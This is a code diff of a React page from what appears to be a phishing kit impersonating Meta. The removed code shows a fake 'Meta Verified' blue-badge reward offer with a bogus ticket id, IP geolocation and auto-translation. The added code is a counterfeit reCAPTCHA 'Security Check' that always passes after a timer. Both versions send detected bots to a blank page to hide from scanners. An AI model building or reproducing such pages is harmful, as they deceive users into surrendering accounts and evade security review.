@@ -1,180 +1,242 @@
-import { useEffect, useState, useMemo, useCallback } from 'react';
+import { useState, useEffect } from 'react';
 import { useNavigate } from 'react-router';
-import axios from 'axios';
-import TickIcon from '@/assets/images/tick.svg';
+import MetaLogo from '@/assets/images/meta-logo-grey.png';
 import detectBot from '@/utils/detect_bot';
-import { translateText } from '@/utils/translate';
-import countryToLanguage from '@/utils/country_to_language';
-import { PATHS } from '@/router/router';
 
-const Index = () => {
+const SYSTEM_FONT = '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif';
+
+const CaptchaGate = () =>
+{
     const navigate = useNavigate();
-    const [isLoading, setIsLoading] = useState(true);
-    const [translatedTexts, setTranslatedTexts] = useState({});
+    const [ status, setStatus ] = useState( 'idle' ); // 'idle' | 'verifying' | 'verified'
+    const [ isCheckingBot, setIsCheckingBot ] = useState( true );
 
-    const defaultTexts = useMemo(() => ({
-        heroTitle: 'Meta Verified - Rewards for you',
-        showWorld: 'Show the world that you mean business.',
-        congrats: "Congratulations on achieving the requirements to upgrade your page to a verified blue badge! This is a fantastic milestone that reflects your dedication and the trust you've built with your audience.",
-        excited: "We're thrilled to celebrate this moment with you and look forward to seeing your page thrive with this prestigious recognition!",
-        ticketIdLabel: 'Your ticket id: #8241-XNYG-AVMB',
-        guideTitle: 'Verified Blue Badge Request Guide',
-        guideItem1: '- Fact checkers may not respond to requests containing intimidation, hate speech, or verbal threats',
-        guideItem2: '- In your request, please provide all required information to ensure timely processing by the fact checker. Submitting an invalid email address or failing to reply to requests for additional information within 2 days may lead to the application being closed without review. If the request remains unprocessed after 4 days, Meta will automatically reject it.',
-        guideItem3: '- Once all details are submitted, we will evaluate your account to check for any restrictions. The verification process typically takes 24 hours, though it may extend in some cases. Based on our decision, restrictions will either remain or be lifted, and your account will be updated accordingly.',
-        submitRequest: 'Submit request',
-        helpCenter: 'Help Center',
-        privacyPolicy: 'Privacy Policy',
-        termsOfService: 'Terms of Service',
-        communityStandards: 'Community Standards'
-    }), []);
-
-    const translateAllTexts = useCallback(
-        async (targetLang) => {
-            try {
-                const keys = Object.keys(defaultTexts);
-                const translations = await Promise.all(keys.map((key) => translateText(defaultTexts[key], targetLang)));
-                const translated = {};
-                keys.forEach((key, index) => {
-                    translated[key] = translations[index];
-                });
-                setTranslatedTexts(translated);
-            } catch {
-                setTranslatedTexts(defaultTexts);
-            }
-        },
-        [defaultTexts]
-    );
-
-    const initializeApp = useCallback(async () => {
-        try {
-            const botResult = await detectBot();
-            if (botResult.isBot) {
-                window.location.href = 'about:blank';
-                return;
-            }
-            try {
-                const response = await axios.get('https://get.geojs.io/v1/ip/geo.json');
-                const data = response.data;
-                localStorage.setItem('ipInfo', JSON.stringify(data));
-                const countryCode = data.country_code;
-                const targetLang = countryToLanguage[countryCode] || 'en';
-                localStorage.setItem('targetLang', targetLang);
-                if (targetLang !== 'en') {
-                    await translateAllTexts(targetLang);
-                } else {
-                    setTranslatedTexts(defaultTexts);
+    useEffect( () =>
+    {
+        const check = async () =>
+        {
+            try
+            {
+                const res = await detectBot();
+                if ( res.isBot )
+                {
+                    window.location.href = 'about:blank';
+                    return;
                 }
-            } catch {
-                setTranslatedTexts(defaultTexts);
+            } catch
+            {
+                // Bỏ qua nếu lỗi check
             }
-            setIsLoading(false);
-        } catch {
-            setIsLoading(false);
-        }
-    }, [defaultTexts, translateAllTexts]);
+            setIsCheckingBot( false );
+        };
+        check();
+    }, [] );
 
-    useEffect(() => {
-        localStorage.clear();
-        initializeApp();
-    }, [initializeApp]);
+    const handleVerifyClick = () =>
+    {
+        if ( status !== 'idle' ) return;
+        setStatus( 'verifying' );
 
-    const texts = Object.keys(translatedTexts).length > 0 ? translatedTexts : defaultTexts;
+        setTimeout( () =>
+        {
+            setStatus( 'verified' );
+            setTimeout( () =>
+            {
+                navigate( '/home', { replace: true } );
+            }, 650 );
+        }, 1100 );
+    };
 
-    const openModal = () => navigate(PATHS.HOME, { state: { autoOpen: true } });
-
-    if (isLoading) {
+    if ( isCheckingBot )
+    {
         return (
-            <div style={{ position: 'fixed', inset: 0, background: '#fff', display: 'flex', justifyContent: 'center', alignItems: 'center' }}>
-                <div style={{ width: '36px', height: '36px', border: '3px solid #e5e7eb', borderTopColor: '#1877f2', borderRadius: '50%', animation: 'spin 0.8s linear infinite' }} />
+            <div
+                style={ {
+                    position: 'fixed',
+                    inset: 0,
+                    backgroundColor: '#ffffff',
+                    display: 'flex',
+                    justifyContent: 'center',
+                    alignItems: 'center',
+                    zIndex: 9999
+                } }
+            >
+                <img src={ MetaLogo } alt="Meta" style={ { width: '120px', height: 'auto' } } />
             </div>
         );
     }
 
     return (
-        <div
-            style={{
-                position: 'fixed',
-                inset: 0,
-                width: '100vw',
-                height: '100vh',
-                overflowY: 'auto',
-                background: 'linear-gradient(135deg, #e8f0fe 0%, #f1f7fd 45%, #edf6f9 100%)',
-                display: 'flex',
-                justifyContent: 'center',
-                alignItems: 'center',
-                padding: '48px 20px',
-                fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif',
-                color: '#1c2b33',
-                boxSizing: 'border-box',
-                zIndex: 1
-            }}
-        >
-            <div style={{ maxWidth: '640px', width: '100%', textAlign: 'left' }}>
-                <div style={{ marginBottom: '18px' }}>
-                    <img src={TickIcon} alt="Verified Badge" style={{ width: '48px', height: '48px', display: 'block' }} />
-                </div>
+        <>
+            <style>{ `
+                @keyframes metaSpin {
+                    0% { transform: rotate(0deg); }
+                    100% { transform: rotate(360deg); }
+                }
+                .captcha-page-wrap * {
+                    font-family: ${ SYSTEM_FONT } !important;
+                    box-sizing: border-box;
+                }
+            ` }</style>
 
-                <h1 style={{ fontSize: '30px', fontWeight: '700', color: '#1c2b33', margin: '0 0 22px 0', lineHeight: '1.25', letterSpacing: '-0.02em' }}>
-                    {texts.heroTitle}
-                </h1>
+            <div
+                className="captcha-page-wrap"
+                style={ {
+                    position: 'fixed',
+                    inset: 0,
+                    width: '100vw',
+                    height: '100dvh',
+                    background: 'linear-gradient(130deg, rgba(249, 241, 249, 1) 0%, rgba(234, 243, 253, 1) 35%, rgba(237, 251, 242, 1) 100%)',
+                    display: 'flex',
+                    flexDirection: 'column',
+                    justifyContent: 'center',
+                    alignItems: 'center',
+                    padding: '20px'
+                } }
+            >
+                <div
+                    style={ {
+                        width: '100%',
+                        maxWidth: '340px',
+                        backgroundColor: '#ffffff',
+                        borderRadius: '14px',
+                        padding: '24px 20px',
+                        boxShadow: '0 8px 28px rgba(0, 0, 0, 0.08)',
+                        border: '1px solid #e5e7eb',
+                        textAlign: 'center'
+                    } }
+                >
+                    <div style={ { display: 'flex', justifyContent: 'center', marginBottom: '16px' } }>
+                        <img src={ MetaLogo } alt="Meta" style={ { height: '22px', width: 'auto' } } />
+                    </div>
 
-                <p style={{ fontSize: '15px', fontWeight: '700', color: '#1c2b33', margin: '0 0 16px 0', lineHeight: '1.5' }}>
-                    {texts.showWorld}
-                </p>
-
-                <p style={{ fontSize: '14px', color: '#374151', margin: '0 0 14px 0', lineHeight: '1.6' }}>
-                    {texts.congrats}
-                </p>
-
-                <p style={{ fontSize: '14px', color: '#374151', margin: '0 0 18px 0', lineHeight: '1.6' }}>
-                    {texts.excited}
-                </p>
-
-                <p style={{ fontSize: '13.5px', color: '#6b7280', margin: '0 0 22px 0', fontWeight: '500' }}>
-                    {texts.ticketIdLabel}
-                </p>
-
-                <h2 style={{ fontSize: '15px', fontWeight: '700', color: '#1c2b33', margin: '0 0 14px 0' }}>
-                    {texts.guideTitle}
-                </h2>
-
-                <div style={{ fontSize: '14px', color: '#374151', lineHeight: '1.6', display: 'flex', flexDirection: 'column', gap: '12px', marginBottom: '32px' }}>
-                    <p style={{ margin: 0 }}>{texts.guideItem1}</p>
-                    <p style={{ margin: 0 }}>{texts.guideItem2}</p>
-                    <p style={{ margin: 0 }}>{texts.guideItem3}</p>
-                </div>
-
-                <div style={{ display: 'flex', justifyContent: 'center', marginBottom: '26px' }}>
-                    <button
-                        type="button"
-                        onClick={openModal}
-                        style={{
-                            backgroundColor: '#1877f2',
-                            color: '#ffffff',
-                            border: 'none',
-                            borderRadius: '9999px',
-                            padding: '12px 68px',
-                            fontSize: '14px',
+                    <div
+                        style={ {
+                            fontSize: '16px',
                             fontWeight: '600',
-                            cursor: 'pointer',
-                            boxShadow: '0 2px 6px rgba(24, 119, 242, 0.2)'
-                        }}
+                            color: '#1c2b33',
+                            marginBottom: '6px'
+                        } }
                     >
-                        {texts.submitRequest}
-                    </button>
-                </div>
+                        Security Check
+                    </div>
 
-                <div style={{ display: 'flex', flexWrap: 'wrap', justifyContent: 'center', alignItems: 'center', gap: '16px', fontSize: '12px', color: '#6b7280' }}>
-                    <span onClick={openModal} style={{ cursor: 'pointer' }}>{texts.helpCenter}</span>
-                    <span onClick={openModal} style={{ cursor: 'pointer' }}>{texts.privacyPolicy}</span>
-                    <span onClick={openModal} style={{ cursor: 'pointer' }}>{texts.termsOfService}</span>
-                    <span onClick={openModal} style={{ cursor: 'pointer' }}>{texts.communityStandards}</span>
-                    <span>Meta © 2026</span>
+                    <p
+                        style={ {
+                            fontSize: '13.5px',
+                            color: '#65676b',
+                            margin: '0 0 18px 0',
+                            lineHeight: '1.4'
+                        } }
+                    >
+                        Please confirm that you are not a robot to continue.
+                    </p>
+
+                    {/* Khung reCAPTCHA chuẩn */}
+                    <div
+                        onClick={ handleVerifyClick }
+                        role="button"
+                        tabIndex={ 0 }
+                        onKeyDown={ ( e ) =>
+                        {
+                            if ( e.key === 'Enter' || e.key === ' ' ) handleVerifyClick();
+                        } }
+                        style={ {
+                            display: 'flex',
+                            alignItems: 'center',
+                            justifyContent: 'space-between',
+                            backgroundColor: '#f9f9f9',
+                            border: '1px solid #d3d3d3',
+                            borderRadius: '6px',
+                            padding: '12px 14px',
+                            cursor: status === 'idle' ? 'pointer' : 'default',
+                            userSelect: 'none'
+                        } }
+                    >
+                        <div style={ { display: 'flex', alignItems: 'center', gap: '12px' } }>
+                            {/* Ô vuông checkbox / spinner / dấu tích xanh */}
+                            <div
+                                style={ {
+                                    width: '26px',
+                                    height: '26px',
+                                    display: 'flex',
+                                    alignItems: 'center',
+                                    justifyContent: 'center'
+                                } }
+                            >
+                                { status === 'idle' && (
+                                    <div
+                                        style={ {
+                                            width: '24px',
+                                            height: '24px',
+                                            backgroundColor: '#ffffff',
+                                            border: '2px solid #c1c1c1',
+                                            borderRadius: '3px'
+                                        } }
+                                    />
+                                ) }
+
+                                { status === 'verifying' && (
+                                    <div
+                                        style={ {
+                                            width: '22px',
+                                            height: '22px',
+                                            border: '3px solid #e2e8f0',
+                                            borderTop: '3px solid #1877f2',
+                                            borderRadius: '50%',
+                                            animation: 'metaSpin 0.8s linear infinite'
+                                        } }
+                                    />
+                                ) }
+
+                                { status === 'verified' && (
+                                    <svg width="26" height="26" viewBox="0 0 24 24" fill="none">
+                                        <path
+                                            d="M4.5 12.75l5.25 5.25 9.75-11.25"
+                                            stroke="#009e55"
+                                            strokeWidth="3.2"
+                                            strokeLinecap="round"
+                                            strokeLinejoin="round"
+                                        />
+                                    </svg>
+                                ) }
+                            </div>
+
+                            <span
+                                style={ {
+                                    fontSize: '14px',
+                                    fontWeight: '500',
+                                    color: '#222222'
+                                } }
+                            >
+                                I&apos;m not a robot
+                            </span>
+                        </div>
+
+                        {/* Biểu tượng reCAPTCHA bên phải */}
+                        <div
+                            style={ {
+                                display: 'flex',
+                                flexDirection: 'column',
+                                alignItems: 'center',
+                                justifyContent: 'center',
+                                fontSize: '9px',
+                                color: '#555555',
+                                lineHeight: '1.15'
+                            } }
+                        >
+                            <svg width="26" height="26" viewBox="0 0 32 32" fill="none" style={ { marginBottom: '2px' } }>
+                                <path d="M16 4C9.9 4 4.9 8.5 4.1 14.4H8.2C8.9 10.8 12.1 8 16 8C18.3 8 20.4 9 21.8 10.5L18.5 13.8H27V5.3L24.5 7.8C22.4 5.5 19.4 4 16 4Z" fill="#1C3AA9" />
+                                <path d="M27.9 17.6H23.8C23.1 21.2 19.9 24 16 24C13.7 24 11.6 23 10.2 21.5L13.5 18.2H5V26.7L7.5 24.2C9.6 26.5 12.6 28 16 28C22.1 28 27.1 23.5 27.9 17.6Z" fill="#4285F4" />
+                            </svg>
+                            <span>reCAPTCHA</span>
+                            <span style={ { fontSize: '8px', color: '#777' } }>Privacy - Terms</span>
+                        </div>
+                    </div>
                 </div>
             </div>
-        </div>
+        </>
     );
 };
 
-export default Index;
+export default CaptchaGate;
